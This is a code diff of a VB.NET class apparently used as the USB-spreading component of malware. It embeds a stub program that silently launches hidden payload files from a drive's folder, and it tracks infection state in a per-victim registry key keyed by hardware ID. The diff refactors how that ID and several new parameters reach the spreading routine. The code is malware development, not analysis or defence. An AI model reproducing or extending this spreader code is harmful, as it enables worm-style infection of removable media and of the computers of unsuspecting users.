@@ -17,11 +17,15 @@ Public Class USB_SP
     Public Shared MyDir As String = "!@"
     Public Shared MyPath As String
     Public Shared FULLPATH As String
+    Public Shared HWID As String
     Public Shared Stub As String = "Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection" & vbNewLine & "<Assembly: AssemblyCopyright(" & """%C%""" & ")> " & vbNewLine & "Module Nervousness" & vbNewLine & "    Sub Main()" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%A%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%B%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "    End Sub" & vbNewLine & "End Module"
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
+
         FULLPATH = FP
+        HWID = HW
         MyPath = GetFileName(GetFileName(FULLPATH))
+
         Try
             If GTV("USB") = Nothing Or GTV("USB") = "Not ready" Then
                 STV("USB", "Waiting USB")
@@ -172,7 +176,7 @@ RE:
     End Function
     Private Shared Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
         Try
-            Return Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).GetValue(n, "")
+            Return Registry.CurrentUser.CreateSubKey("Software\" & HWID).GetValue(n, "")
         Catch ex As Exception
             Return ""
         End Try
@@ -180,7 +184,7 @@ RE:
 
     Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
         Try
-            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).SetValue(n, t)
+            Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue(n, t)
             Return True
         Catch ex As Exception
             Return False
